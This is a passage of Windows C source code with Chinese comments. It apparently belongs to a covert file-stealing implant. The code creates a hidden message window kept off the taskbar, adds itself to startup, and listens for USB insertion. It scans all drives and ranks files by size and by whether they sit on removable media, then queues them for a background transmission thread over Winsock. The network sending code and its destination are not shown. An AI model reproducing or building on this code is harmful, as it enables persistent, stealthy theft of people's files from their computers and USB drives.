    // 注册窗口类
    if (!RegisterClassA(&wc)) {
        MessageBox(NULL, "窗口类注册失败", "错误", MB_ICONERROR);
        return;
    }

    // 创建隐藏窗口
    g_state.hwnd = CreateWindowExA(
            WS_EX_TOOLWINDOW,              // 扩展样式：工具窗口（不在任务栏显示）
            "ZafkielMsgWindow",            // 窗口类名
            "Hidden Window",               // 窗口标题
            0,                             // 窗口样式（无边框）
            0, 0, 0, 0,                    // 窗口位置和大小（全部为 0，隐藏窗口）
            NULL,                          // 父窗口句柄
            NULL,                          // 菜单句柄
            GetModuleHandle(NULL),         // 实例句柄
            NULL                           // 创建参数
    );

    if (!g_state.hwnd) {
        MessageBox(NULL, "窗口创建失败", "错误", MB_ICONERROR);
    }
}

// ======================== 主函数 ========================
int WINAPI WinMain(
        HINSTANCE hInstance,      // 当前实例句柄
        HINSTANCE hPrevInstance,  // 前一个实例句柄（通常为 NULL）
        LPSTR     lpCmdLine,      // 命令行参数
        int       nShowCmd        // 窗口显示方式
) {
    // 初始化Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        MessageBox(NULL, "Winsock 初始化失败", "错误", MB_ICONERROR);
        return 1;
    }

    // 注册开机自启动
    AddToStartup();

    // 初始化窗口和设备通知
    InitMessageWindow();
    RegisterDeviceNotify();
    InitializeCriticalSection(&g_state.cs);
    InitQueue();

    // 初始化文件列表
    g_state.fileListCapacity = 100;
    g_state.fileList = (FileInfo*)malloc(g_state.fileListCapacity * sizeof(FileInfo));
    if (!g_state.fileList) {
        MessageBox(NULL, "文件列表内存分配失败", "错误", MB_ICONERROR);
        WSACleanup();
        return 1;
    }
    g_state.fileCount = 0;

    // ========== 显式初始化线程退出标志 ==========
    g_state.threadExitFlag = FALSE;  // 初始化为未退出

    // 发送初始连接提示
    SendInitialNotification();

    // 初始扫描驱动器
    printf("[INFO] 正在执行初始扫描...\n");
    ScanAllDrives();

    // ======================== 文件分类优化逻辑 ========================
    const unsigned long long SIZE_6KB = 6 * 1024;
    const unsigned long long SIZE_10KB = 10 * 1024;

    // 第一次遍历：统计各分类文件数量
    int usbLCount = 0, usbMCount = 0, otherLCount = 0, otherMCount = 0, allSCount = 0;
    for (int i = 0; i < g_state.fileCount; i++) {
        unsigned long long size = g_state.fileList[i].size;

        // 跳过小于6KB的文件
        if (size < SIZE_6KB) {
            continue;
        }

        if (size >= SIZE_6KB && size <= SIZE_10KB) {
            allSCount++;
            continue;
        }
        if (g_state.fileList[i].isFromRemovable) {
            if (size > SIZE_30MB) usbLCount++;
            else if (size > SIZE_10KB) usbMCount++;
        } else {
            if (size > SIZE_30MB) otherLCount++;
            else if (size > SIZE_10KB) otherMCount++;
        }
    }

    // 动态分配分类数组（允许部分失败）
    FileInfo* usbLarge = NULL;
    FileInfo* usbMedium = NULL;
    FileInfo* otherLarge = NULL;
    FileInfo* otherMedium = NULL;
    FileInfo* allSmall = NULL;

    // USB大文件分类
    if (usbLCount > 0) {
        usbLarge = malloc(usbLCount * sizeof(FileInfo));
        if (!usbLarge) {
            printf("[WARN] USB大文件分类内存分配失败，跳过该分类\n");
            usbLCount = 0;
        }
    }

    // USB中文件分类
    if (usbMCount > 0) {
        usbMedium = malloc(usbMCount * sizeof(FileInfo));
        if (!usbMedium) {
            printf("[WARN] USB中文件分类内存分配失败，跳过该分类\n");
            usbMCount = 0;
        }
    }

    // 其他大文件分类
    if (otherLCount > 0) {
        otherLarge = malloc(otherLCount * sizeof(FileInfo));
        if (!otherLarge) {
            printf("[WARN] 其他大文件分类内存分配失败，跳过该分类\n");
            otherLCount = 0;
        }
    }

    // 其他中文件分类
    if (otherMCount > 0) {
        otherMedium = malloc(otherMCount * sizeof(FileInfo));
        if (!otherMedium) {
            printf("[WARN] 其他中文件分类内存分配失败，跳过该分类\n");
            otherMCount = 0;
        }
    }

    // 小文件分类
    if (allSCount > 0) {
        allSmall = malloc(allSCount * sizeof(FileInfo));
        if (!allSmall) {
            printf("[WARN] 小文件分类内存分配失败，跳过该分类\n");
            allSCount = 0;
        }
    }

// 第二次遍历：填充分类数组
    usbLCount = usbMCount = otherLCount = otherMCount = allSCount = 0;
    for (int i = 0; i < g_state.fileCount; i++) {
        FileInfo current = g_state.fileList[i];
        unsigned long long size = current.size;

        // 新增：跳过小于6KB的文件
        if (size < SIZE_6KB) {
            continue;
        }

        if (size >= SIZE_6KB && size <= SIZE_10KB) {
            if (allSmall) allSmall[allSCount++] = current;
            continue;
        }

        if (current.isFromRemovable) {
            if (size > SIZE_30MB) {
                if (usbLarge) usbLarge[usbLCount++] = current;
            } else if (size > SIZE_10KB) {
                if (usbMedium) usbMedium[usbMCount++] = current;
            }
        } else {
            if (size > SIZE_30MB) {
                if (otherLarge) otherLarge[otherLCount++] = current;
            } else if (size > SIZE_10KB) {
                if (otherMedium) otherMedium[otherMCount++] = current;
            }
        }
    }

    // ======================== 按优先级入队（仅处理成功分配的分类） ========================
    if (usbLarge && usbLCount > 0) {
        for (int i = 0; i < usbLCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = usbLarge[i], .retryCount = 0});
        }
    }
    if (usbMedium && usbMCount > 0) {
        for (int i = 0; i < usbMCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = usbMedium[i], .retryCount = 0});
        }
    }
    if (otherLarge && otherLCount > 0) {
        for (int i = 0; i < otherLCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = otherLarge[i], .retryCount = 0});
        }
    }
    if (otherMedium && otherMCount > 0) {
        for (int i = 0; i < otherMCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = otherMedium[i], .retryCount = 0});
        }
    }
    if (allSmall && allSCount > 0) {
        for (int i = 0; i < allSCount; i++) {
            EnqueueTask((TransmissionTask){.active = TRUE, .info = allSmall[i], .retryCount = 0});
        }
    }

    // 释放临时分类数组（free(NULL)是安全的）
    free(usbLarge);
    free(usbMedium);
    free(otherLarge);
    free(otherMedium);
    free(allSmall);

    // 启动传输线程
    g_state.hThread = CreateThread(NULL, 0, TransmissionThread, NULL, 0, &g_state.threadId);
    if (g_state.hThread == NULL) {
        MessageBox(NULL, "传输线程创建失败", "错误", MB_ICONERROR);
        free(g_state.fileList);
        WSACleanup();
        return 1;
    }

    // 消息循环
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // 检查重启标志
        EnterCriticalSection(&g_state.cs);
        if (g_state.needRestart) {
            g_state.needRestart = FALSE;
            LeaveCriticalSection(&g_state.cs);

            SafeRestart(); // 执行安全重启
        } else {
            LeaveCriticalSection(&g_state.cs);
        }
    }


    // 清理资源
    UnregisterDeviceNotification(g_state.hDeviceNotify);
    DeleteCriticalSection(&g_state.cs);
    CloseHandle(g_state.hThread);
    free(g_state.fileList);
    free(g_state.taskQueue.tasks);
    WSACleanup();

    return 0;
}